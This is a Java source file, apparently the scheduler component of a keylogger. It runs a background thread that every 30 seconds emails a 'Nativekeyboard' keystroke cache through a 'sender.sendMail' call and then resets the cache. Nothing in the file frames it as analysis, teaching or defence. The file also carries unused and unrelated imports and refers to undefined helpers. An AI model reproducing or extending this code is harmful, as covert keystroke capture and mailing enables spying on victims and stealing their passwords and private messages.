package Manager;

import jdk.jshell.execution.Util;
import keys.Nativekeyboard;
import org.bouncycastle.jcajce.provider.symmetric.util.PBE;
import org.bouncycastle.jce.provider.BrokenPBE;

import javax.swing.plaf.basic.BasicGraphicsUtils;
import javax.swing.text.Utilities;

public class manageservice implements Runnable {
    private Nativekeyboard keyboard;
    private Thread service;

    public manageservice() {
        keyboard = new Nativekeyboard();

        service = new Thread(this, "Manager Service");
        service.start();
    }

    public Nativekeyboard getKeyboard() {
        return keyboard;
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            if (elapsed > 30_000) {
                try {
                    sender.sendMail(utils.prettyPrint(keyboard.getKeycache()));
                    keyboard.onsend();
                } catch (Throwable e) {
                    e.printStackTrace();
                    keyboard.onfail();
                }
                start=System.nanoTime();            }
        }
    }
}
